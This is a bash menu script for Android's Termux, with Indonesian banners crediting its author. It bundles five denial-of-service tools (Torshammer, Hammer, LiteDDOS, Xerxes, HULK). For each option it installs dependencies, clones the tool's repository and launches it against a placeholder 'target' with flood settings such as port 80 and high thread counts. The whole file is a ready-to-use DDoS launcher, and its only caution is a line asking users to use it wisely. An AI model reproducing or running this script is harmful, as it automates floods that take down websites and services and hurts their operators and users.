#!/system/xbin/bash

clear
b='\033[1m'
u='\033[4m'
bl='\E[30m'
r='\E[31m'
g='\E[32m'
bu='\E[34m'
m='\E[35m'
c='\E[36m'
w='\E[37m'
endc='\E[0m'
enda='\033[0m'
blue='\e[1;34m'
cyan='\e[1;36m'
red='\e[1;31m'

figlet Welcome | lolcat
echo "Peringatan...Gunakan Tools Saya Dengan Bijak :) " |lolcat
sleep 2

echo "=======================================" |lolcat
echo  "Welcome Tools    : Mr.Andre.Wp      " |lolcat
echo  "My Blog  : fightercxshacking             " |lolcat
echo  "My Youtube  : Andre Gaming Wp      " |lolcat
echo  "My Instagram : @andre_wp475        " |lolcat
echo "=======================================" |lolcat

echo "<~DAFTAR ISI~>" |lolcat
echo ""
echo "<<~Kumpulan Tools DDOS ATTACK~>>" |lolcat
echo "<<Kalau Lama Instal Nya Di Tunggu Ya Bos>>" |lolcat
echo "<<Wajar Aja Bos Soal Nya Ini Tools DDOS>>" |lolcat
echo ""
echo "1.  TORSHAMMER"
echo "============================" | lolcat
echo "2.  HAMMER"
echo "============================" | lolcat
echo "3.  LITEDDOS"
echo "============================" | lolcat
echo "4.  XERXES"
echo "============================" | lolcat
echo "5.  HULK"
echo "============================" | lolcat
echo "0.  EXIT"
echo "============================" | lolcat
echo ""
echo "╭─Pilih Bos" |lolcat
read -p "╰─#" pil;

if [ $pil = 1 ]
then
clear
figlet WAIT.. |lolcat
apt update && apt upgrade -y
pkg install git -y
pkg install tor -y
pkg install python2 -y
git clone https://github.com/dotfighter/torshammer.git
cd torshammer
python2 torshammer.py -t target -r 256
fi

if [ $pil = 2 ]
then
clear
figlet WAIT.. |lolcat
apt update && apt upgrade -y
pkg install python -y
pkg install git -y
git clone http://github.com/cyweb/hammer
cd hammer
python hammer.py
python3 hammer.py -s target -p 80 -t 135
fi

if [ $pil = 3 ]
then
clear
figlet WAIT.. |lolcat
apt update && apt upgrade -y
pkg install git -y
pkg install python2 -y
git clone https://github.com/4L13199/LITEDDOS
cd LITEDDOS
python2 liteDDOS.py target -p 80 -t 100
fi

if [ $pil = 4 ]
then
clear
figlet WAIT.. |lolcat
apt update && apt upgrade -y
pkg install git -y
pkg install clang -y
git clone https://github.com/zanyarjamal/xerxes
cd xerxes
clang xerxes.c -o xerxes
chmod 777 xerxes
./xerxes target 80
fi

if [ $pil = 5 ]
then
clear
figlet WAIT.. |lolcat
apt update && apt upgrade -y
pkg install git -y
pkg install python2 -y
git clone https://github.com/grafov/hulk.git
cd hulk
chmod +x hulk.py
python2 hulk.py target
fi

if [ $pil = 0 ]
then
clear
figlet WAIT.. |lolcat
echo "Thanks Udah Makai Tools Saya:)..."
exit
fi